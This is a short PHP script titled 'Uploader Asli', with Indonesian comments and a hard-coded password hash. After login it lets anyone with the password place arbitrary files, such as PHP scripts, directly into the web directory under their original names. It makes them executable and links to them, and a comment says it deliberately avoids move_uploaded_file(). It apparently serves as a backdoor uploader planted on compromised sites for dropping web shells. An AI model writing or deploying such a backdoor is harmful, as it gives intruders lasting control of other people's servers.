<?php
session_start();

// Password hash untuk login
$hashed_password = '$2a$12$bfNsCSDep3cSt9tRQaUfm.d97GWev2NSFwjbu.SDMFlDO4/AxF4eK';

// Login handler
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    if (password_verify($_POST['password'], $hashed_password)) {
        $_SESSION['logged_in'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    } else {
        $error = "Password salah.";
    }
}

// Upload handler
if (isset($_SESSION['logged_in']) && $_SESSION['logged_in']) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
        $file = $_FILES['file'];

        if ($file['error'] !== UPLOAD_ERR_OK) {
            $upload_msg = "Error upload: " . $file['error'];
        } elseif ($file['size'] == 0) {
            $upload_msg = "File size 0 KB. Tidak valid.";
        } elseif (!is_uploaded_file($file['tmp_name'])) {
            $upload_msg = "File tidak diupload melalui formulir.";
        } else {
            // Gunakan nama file asli
            $target = __DIR__ . '/' . $file['name'];

            // Coba pindahkan tanpa move_uploaded_file()
            if (rename($file['tmp_name'], $target)) {
                chmod($target, 0755); // Beri izin
                $upload_msg = "Upload sukses: <a href='" . htmlspecialchars($file['name']) . "' target='_blank'>" . htmlspecialchars($file['name']) . "</a>";
            } else {
                $upload_msg = "Gagal memindahkan file. Izin direktori?";
            }
        }
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Uploader Asli</title>
    <style>
        body { font-family: monospace; text-align: center; background: #111; color: #0f0; padding: 40px; }
        input[type="file"], input[type="password"] { margin: 10px auto; display: block; width: 300px; padding: 8px; }
        button { padding: 10px 20px; background: #0f0; color: #000; border: none; cursor: pointer; }
        .msg { margin: 20px 0; }
    </style>
</head>
<body>

<?php if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']): ?>
    <h2>Login</h2>
    <?php if (isset($error)) echo "<div class='msg' style='color:red;'>$error</div>"; ?>
    <form method="POST">
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Login</button>
    </form>
<?php else: ?>
    <h2>Upload File</h2>
    <?php if (isset($upload_msg)) echo "<div class='msg'>$upload_msg</div>"; ?>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file" required>
        <button type="submit">Upload</button>
    </form>
    <p><a href="./">Lihat file</a></p>
<?php endif; ?>
</body>
</html>